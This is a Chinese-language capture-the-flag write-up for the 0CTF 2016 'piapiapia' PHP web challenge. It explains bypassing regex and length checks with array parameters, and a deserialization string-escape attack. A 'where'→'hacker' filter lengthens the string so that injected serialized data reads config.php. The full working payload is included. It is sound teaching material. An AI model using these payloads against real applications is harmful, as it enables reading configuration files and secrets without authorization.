# [0CTF 2016]piapiapia

## 前言

这道题主要考两个知识点：

* **数组绕过正则**
  * **preg_match(pattern,Array()) = false**
  * md5(Array()) = null
  * sha1(Array()) = null
  * ereg(pattern,Array()) =null
  * strcmp(Array(), “abc”) =null
  * strpos(Array(),“abc”) = null
  * strlen(Array()) = null

* **改变序列化字符串，导致反序列化漏洞**

  改变序列化之后的字符串，使反序列化时成功反序列化并改变数组值。

  举个例子：

  * ``` php
    $profile = 'a:2:{s:8:"nickname";a:1:{i:0;s:204:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:13:"lurenxiao.jpg";}';
    var_dump(unserialize($profile));
    ```

  * 结果：

    array(2) {
      ["nickname"]=>
      array(1) {
        [0]=>
        string(204) "wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}"
      }
      ["photo"]=>
      string(13) "lurenxiao.jpg"
    }

  * 当我们把所有的where替换成hacker

  * ``` php
    $profile = 'a:2:{s:8:"nickname";a:1:{i:0;s:204:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:13:"lurenxiao.jpg";}';
    var_dump(unserialize($profile));
    ```

  * 结果：

    array(2) {
      ["nickname"]=>
      array(1) {
        [0]=>
        string(204) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
      }
      ["photo"]=>
      string(10) "config.php"
    }

  我们可以看到photo的值从lurenxiao.jpg变成了config.php。

  要了解这个首先了解序列化字符串的结构：

  * `'a:2:{s:8:"nickname";a:1:{i:0;s:204:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:13:"lurenxiao.jpg";}'`
  * 上边这个序列化第一个a表示数组，2表示有两个值
  * 之后跟着key和value。

  在`s:a:"*******"` 反序列化时，不管`s:a:"`​之后是什么（包括双引号和单引号），都会数a个字符作为这个反序列化的结果。

  在字符串从前向后的反序列化过程中，若在字符串的某个位置成功反序列化，那么后续的字符串都会被抛弃。

  如何看不懂可以看这位大佬的writeup https://www.jianshu.com/p/3b44e72444c1，讲得比较详细。

## 解题过程

用扫描器扫描网站，dirsearch和御剑可以扫出www.zip

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\3.png)

我们在config.php可以看到flag

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\4.png)

看来是要我们获取config.php，审查源码，Seay可以给到一个提示（第三行

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\2.png)

​    \$photo = base64\_encode(file\_get\_contents(​\$profile['photo']));

而配置由update.php上传，并进行序列化

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\5.png)

看update_profile这个函数，filter之后上传

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\6.png)

看filter，发现'select', 'insert', 'update', 'delete', "where"替换为"hacker"，只有where从5个字符变成6个字符多一个字符，这个时候想到可以用上边 **改变序列化字符串，导致反序列化漏洞** 。在nickname中插入where字符，在filter的时候会把where替换为hacker，导致部分字符逃逸。逃逸出的字符为设置photo为config.php的字符。

![image-20191212185753148](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\10.png)

但是事情还没有那么简单，题目在我们上传nickname的时候给了一些限制

![image-20191212190519129](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\11.png)

限制了nickname的长度，怎么办呢？这个时候就用到了 **数组绕过正则** 这个知识点让$_POST['nickname']为一个数组，就可以让这两个都为非。

## 结果

在update.php上传时，

* 把nickname改为nickname[]
* 值为`wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}`

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\1.png)

之后访问profile.php

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\8.png)

把这一段base64解密可得flag

![](D:\CTF\ctf\web\buuctf\[0CTF 2016]piapiapia\截图\9.png)

